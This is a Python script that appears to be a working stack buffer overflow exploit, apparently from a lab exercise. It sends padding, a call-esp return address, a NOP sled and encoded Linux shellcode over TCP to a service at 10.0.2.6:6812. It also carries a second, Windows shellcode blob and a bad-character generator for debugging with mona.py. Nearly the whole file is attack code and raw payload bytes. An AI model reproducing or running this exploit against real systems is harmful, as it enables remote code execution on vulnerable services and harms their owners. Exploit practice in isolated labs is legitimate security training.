import socket
import struct
import time


def conv(address):
    return struct.pack("<I", address)

def generate_badchar():
    badchar_str = b""

    # Badchars causing payload to fail.
    badchar_list = [0x00, 0x0A]

    # Generate string to test for badchars.
    for i in range(0x00, 0xff + 1):
        if i not in badchar_list:
            badchar_str += struct.pack("B", i)

    # For comparison with mona.py , !mona compare -f "location_of_badchar_bin_file" -a "hex_address_where_payload_is_located"
    with open("badchar_file.bin", "wb+") as bf:
        bf.write(badchar_str)

    return badchar_str

def exploit():
    target_ip = '10.0.2.6'
    target_port = 6812

    # 0x52501515 : call esp
    # 0x52501513 : jmp esp

    # jmp_esp = conv(0x52501513)
    # debug_int = b'\xCC' * 16

    call_esp = conv(0x52501515)

    junk = b'B' * 524
    ret_addr = call_esp
    nop_sled = b'\x90' * 16

    linux_shellcode=  b""
    linux_shellcode+= b"\xbb\xfa\x75\xd1\xc0\xda\xc9\xd9\x74\x24\xf4\x58\x29"
    linux_shellcode+= b"\xc9\xb1\x12\x31\x58\x12\x83\xc0\x04\x03\xa2\x7b\x33"
    linux_shellcode+= b"\x35\x63\x5f\x44\x55\xd0\x1c\xf8\xf0\xd4\x2b\x1f\xb4"
    linux_shellcode+= b"\xbe\xe6\x60\x26\x67\x49\x5f\x84\x17\xe0\xd9\xef\x7f"
    linux_shellcode+= b"\xf9\x19\x12\x77\x95\x1b\x12\x96\x39\x95\xf3\x28\xa7"
    linux_shellcode+= b"\xf5\xa2\x1b\x9b\xf5\xcd\x7a\x16\x79\x9f\x14\xc7\x55"
    linux_shellcode+= b"\x53\x8c\x7f\x85\xbc\x2e\xe9\x50\x21\xfc\xba\xeb\x47"
    linux_shellcode+= b"\xb0\x36\x21\x07"

    windows_shellcode = b""
    windows_shellcode+= b"\xd9\xc8\xd9\x74\x24\xf4\xbd\xb6\xa5\x24\xe4\x58\x31"
    windows_shellcode+= b"\xc9\xb1\x52\x83\xc0\x04\x31\x68\x13\x03\xde\xb6\xc6"
    windows_shellcode+= b"\x11\xe2\x51\x84\xda\x1a\xa2\xe9\x53\xff\x93\x29\x07"
    windows_shellcode+= b"\x74\x83\x99\x43\xd8\x28\x51\x01\xc8\xbb\x17\x8e\xff"
    windows_shellcode+= b"\x0c\x9d\xe8\xce\x8d\x8e\xc9\x51\x0e\xcd\x1d\xb1\x2f"
    windows_shellcode+= b"\x1e\x50\xb0\x68\x43\x99\xe0\x21\x0f\x0c\x14\x45\x45"
    windows_shellcode+= b"\x8d\x9f\x15\x4b\x95\x7c\xed\x6a\xb4\xd3\x65\x35\x16"
    windows_shellcode+= b"\xd2\xaa\x4d\x1f\xcc\xaf\x68\xe9\x67\x1b\x06\xe8\xa1"
    windows_shellcode+= b"\x55\xe7\x47\x8c\x59\x1a\x99\xc9\x5e\xc5\xec\x23\x9d"
    windows_shellcode+= b"\x78\xf7\xf0\xdf\xa6\x72\xe2\x78\x2c\x24\xce\x79\xe1"
    windows_shellcode+= b"\xb3\x85\x76\x4e\xb7\xc1\x9a\x51\x14\x7a\xa6\xda\x9b"
    windows_shellcode+= b"\xac\x2e\x98\xbf\x68\x6a\x7a\xa1\x29\xd6\x2d\xde\x29"
    windows_shellcode+= b"\xb9\x92\x7a\x22\x54\xc6\xf6\x69\x31\x2b\x3b\x91\xc1"
    windows_shellcode+= b"\x23\x4c\xe2\xf3\xec\xe6\x6c\xb8\x65\x21\x6b\xbf\x5f"
    windows_shellcode+= b"\x95\xe3\x3e\x60\xe6\x2a\x85\x34\xb6\x44\x2c\x35\x5d"
    windows_shellcode+= b"\x94\xd1\xe0\xf2\xc4\x7d\x5b\xb3\xb4\x3d\x0b\x5b\xde"
    windows_shellcode+= b"\xb1\x74\x7b\xe1\x1b\x1d\x16\x18\xcc\x28\xe7\x20\x04"
    windows_shellcode+= b"\x45\xe5\x24\x05\xc9\x60\xc2\x4f\xe1\x24\x5d\xf8\x98"
    windows_shellcode+= b"\x6c\x15\x99\x65\xbb\x50\x99\xee\x48\xa5\x54\x07\x24"
    windows_shellcode+= b"\xb5\x01\xe7\x73\xe7\x84\xf8\xa9\x8f\x4b\x6a\x36\x4f"
    windows_shellcode+= b"\x05\x97\xe1\x18\x42\x69\xf8\xcc\x7e\xd0\x52\xf2\x82"
    windows_shellcode+= b"\x84\x9d\xb6\x58\x75\x23\x37\x2c\xc1\x07\x27\xe8\xca"
    windows_shellcode+= b"\x03\x13\xa4\x9c\xdd\xcd\x02\x77\xac\xa7\xdc\x24\x66"
    windows_shellcode+= b"\x2f\x98\x06\xb9\x29\xa5\x42\x4f\xd5\x14\x3b\x16\xea"
    windows_shellcode+= b"\x99\xab\x9e\x93\xc7\x4b\x60\x4e\x4c\x7b\x2b\xd2\xe5"
    windows_shellcode+= b"\x14\xf2\x87\xb7\x78\x05\x72\xfb\x84\x86\x76\x84\x72"
    windows_shellcode+= b"\x96\xf3\x81\x3f\x10\xe8\xfb\x50\xf5\x0e\xaf\x51\xdc"

    bof  = b''
    bof += junk
    bof += ret_addr
    bof += nop_sled
    bof += linux_shellcode

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as conn:
        try:
            conn.connect((target_ip, target_port))
            conn.sendall(bof)
            print(f"[*] Sending data: {bof}")

        except Exception as err:
            print(f"Error -> {err}")        

if __name__ == "__main__":
    exploit()